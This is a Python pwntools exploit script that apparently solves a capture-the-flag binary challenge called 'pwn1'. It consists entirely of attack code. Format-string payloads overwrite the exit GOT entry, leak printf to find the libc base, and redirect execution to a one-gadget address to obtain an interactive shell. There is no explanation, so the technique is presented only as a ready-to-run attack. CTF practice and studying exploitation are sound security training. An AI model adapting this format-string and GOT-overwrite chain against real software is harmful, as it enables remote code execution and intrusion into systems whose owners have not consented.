#!/usr/bin/env python3

from pwn import *
import re

exe = context.binary = ELF('./pwn1')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc = ELF("./libc6_2.19-0ubuntu6.14_amd64.so")

host = args.HOST or '79gq4l5zpv1aogjgw6yhhymi4.ctf.p0wnhub.com'
port = int(args.PORT or 11337)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x4011D8
continue
'''.format(**locals())

io = start()

payload = (
    p64(exe.got["exit"]) +
    b"B" * 8 +
    b"%4434x" +
    b"%8$hn"
)
io.sendline(payload)
io.recv(0x1024)
io.recv(0x1024)

payload = (
    p64(exe.got["printf"]) +
    b"B" * 8 +
    b"_%8$s_"
)
io.sendline(payload)
data = io.recv(1024)

libc_leak = u64(re.search(b"_(.+?)_", data).group(1).ljust(8, b"\x00"))
libc.address = libc_leak - libc.sym.printf 

log.info("Libc leak: 0x%x", libc_leak)
log.info("Libc: 0x%x", libc.address)
log.info("System: 0x%x", libc.sym.system)

pop4_ret = 0x401254 # : pop r12 ; pop r13 ; pop r14 ; pop r15 ; re

num = (pop4_ret & 0xffff)
fmt = "%" + str(num) + "x"
payload = (
    p64(exe.got["exit"]) +
    p64(libc.address + 0x4f2c5) +
#    p64(libc.address + 0x46428) +
    bytes(fmt, "utf-8") +
    b"%8$hn"
)
io.sendline(payload)

io.interactive()
